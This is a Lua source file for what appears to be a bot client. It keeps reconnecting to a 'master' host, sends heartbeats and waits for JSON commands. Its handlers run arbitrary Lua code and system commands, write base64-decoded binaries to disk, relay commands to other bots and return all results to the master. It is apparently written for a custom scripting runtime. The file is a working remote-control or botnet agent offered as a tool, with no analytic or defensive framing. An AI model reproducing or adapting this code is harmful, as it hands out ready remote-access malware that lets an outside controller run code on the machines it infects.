
string.trim = string.trim or (function(self)
	return (self:gsub("^%s*(.-)%s*$", "%1"))
end)

function map(fun, lst)
	local output = {}
	for k,v in ipairs(lst) do
		table.insert(output, fun(v))
	end
	return output
end

function ExecuteCommand(command)--Executes a command, returns its result
	command = command or ""--Ensure command isn't nil.
	local sys = cmd:getSys()
	command = command:trim()

	if(command:sub(1,3) == "cd ")then
		return sys:cd(command:sub(4,-1))
	else
		local _, ret = pcall(sys.exec, sys, command)
		return ret
	end
end

function ExecuteCommands(cmdList)--Executes a list of commands, returns list of results
	return map(ExecuteCommand, cmdList)
end

local commandHandlers = {
	SCRIPT=function(self,args)
		local success, res = pcall(loadstring,args["CONTENT"])
		if(success)then
			return res()
		end
	end;
	EXECUTE=function(self,args)
		local t = type(args["CONTENT"])
		if(t == "table")then
			return ExecuteCommands(args["CONTENT"])
		elseif(t == "string")then
			return ExecuteCommand(args["CONTENT"])
		else
			return "Invalid call to Execute"
		end
	end;
	IDENTIFY=function(self,args)
		return genIdentBot()
	end;
	SAVEBIN=function(self,args)
		return pcall(file.write, args["CONTENT"]["name"], base64.dec(args["CONTENT"]["data"]))
	end;
	STATUS=function(self,args)
		local state = args["CONTENT"]
		if(not state)then
			return
		end
		
		if(state["IDENT"]=="SUCCESS")then
			print("#Identified successfully as a "..state["STATE"])
		else
			print("#Identification Failed, retrying in 5 seconds...")
			sleep(5000)
			return self:IDENTIFY()
		end
	end;
	RELAYED=function(self,args)
		local success, res = pcall(handleCommand, args["CONTENT"]["COMMAND"], args["CONTENT"])
		if(success and res~=nil)then
			return {COMMAND="RESPOND", TARGET=args["SENDER"], CONTENT=res}
		else
			return nil
		end
	end;
}
function handleCommand(command, args)
	return (commandHandlers[command] and commandHandlers[command](commandHandlers,args)) or nil
end

function protocolCommand(jsondat)
	local success, command = pcall(json.dec,jsondat)
	if(not success)then
		return
	end
	local success, res = pcall(handleCommand, command["COMMAND"], command)
	if(success and res~=nil)then
		return res
	else
		return
	end
end

function commandLoop(cmdMgr)
	while(true)do
		cmdMgr:put(json.enc({COMMAND="STATUS"}))--Heartbeat to check if the connection is alive
		local command = cmdMgr:get()
		if(not command)then
			sleep(5000)--Wait 5 seconds for a new command
		else
			print("=> "..tostring(command))
			
			local res = protocolCommand(command)
			if(res~=nil)then
				res = json.enc(res)
				print("<= "..tostring(res))
				cmdMgr:put(res)
			end
		end
	end
end

function connectionLoop(host, port)
	while(true)do
		--Attempt to connect to the master
		print("#Attempting connection to master...")
		local success, sock = pcall(net.connect, net, tostring(host), tonumber(port))
		if(success)then
			--Should loop until disconnection.
			print("#Connected.")
			local success,_ = pcall(commandLoop, CommandManager(sock))
			if(success == false)then
				print("#Lost connection to master, Attempting reconnection...")
			end
		else
			print("#Failed. Waiting 5 seconds")
			sleep(5000)--Try again in 5 seconds.
		end
	end
end
